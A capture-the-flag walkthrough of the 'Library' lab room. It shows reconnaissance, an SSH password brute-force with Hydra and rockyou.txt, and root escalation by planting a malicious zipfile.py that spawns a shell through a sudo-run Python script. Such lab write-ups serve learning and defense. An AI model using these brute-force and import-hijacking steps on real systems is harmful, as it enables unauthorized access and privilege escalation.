# Library CTF — Full Walkthrough

**Room:** Library | **Difficulty:** Easy | **Flags:** 2

| Detail | Value |
|--------|-------|
| Target IP | `10.48.176.241` |
| Attack IP | `10.x.x.x` |
| OS | Linux |

---

## Flags Overview

| # | Method |
|---|--------|
| 01 | SSH brute-force via Hydra (`rockyou.txt`) |
| 02 | Python library hijacking (malicious `zipfile.py`) |

---

## Phase 1: Reconnaissance

```bash
nmap -sC -sV 10.48.176.241 -oN nmap_scan.txt
```

**Open Ports:**

| Port | Service |
|------|---------|
| 22/tcp | SSH |
| 80/tcp | HTTP |

### Web Enumeration

```bash
# Check robots.txt — hint found!
curl -s http://10.48.176.241/robots.txt
# Output: User-agent: rockyou

# Directory brute-forcing
gobuster dir -u http://10.48.176.241 -w /usr/share/wordlists/dirb/common.txt
```

The `robots.txt` hints at using the `rockyou.txt` wordlist. Blog posts on the site reveal a username: `meliodas`.

---

## Phase 2: Exploitation — SSH Brute-Force

```bash
hydra -l meliodas -P /usr/share/wordlists/rockyou.txt ssh://10.48.176.241
```

**Credentials found:** `meliodas:iloveyou1`

```bash
ssh meliodas@10.48.176.241
```

**Flag 01:** `cat user.txt`

---

## Phase 3: Privilege Escalation — Python Import Hijacking

### Enumeration

```bash
sudo -l
```

**Result:** User `meliodas` can run `/usr/bin/python* /home/meliodas/bak.py` as **root** without a password.

### Analyzing `bak.py`

The script imports the `zipfile` module:

```python
import zipfile
```

Python searches the **current working directory** first for imports. This means we can create our own `zipfile.py` in the same directory.

### Exploitation

```bash
# Create a malicious zipfile.py that spawns a root shell
echo 'import os; os.system("/bin/bash -p")' > zipfile.py

# Run bak.py as root — it imports our malicious zipfile.py
sudo python /home/meliodas/bak.py
```

**Root shell obtained.**

**Flag 02:** `cat /root/root.txt`

---

## Vulnerability Chain

1. **Information disclosure** — `robots.txt` leaks wordlist hint
2. **Weak credentials** — SSH password cracked via `rockyou.txt`
3. **Sudo misconfiguration** — Script run as root with `NOPASSWD`
4. **Python import hijacking** — Exploiting module search order (current directory first)

## Key Takeaways

- **`robots.txt` can leak hints** to attackers
- **Python import order matters** — Python loads modules from the current directory before system paths
- **Audit sudo permissions** — scripts running as root can be hijacked via import manipulation
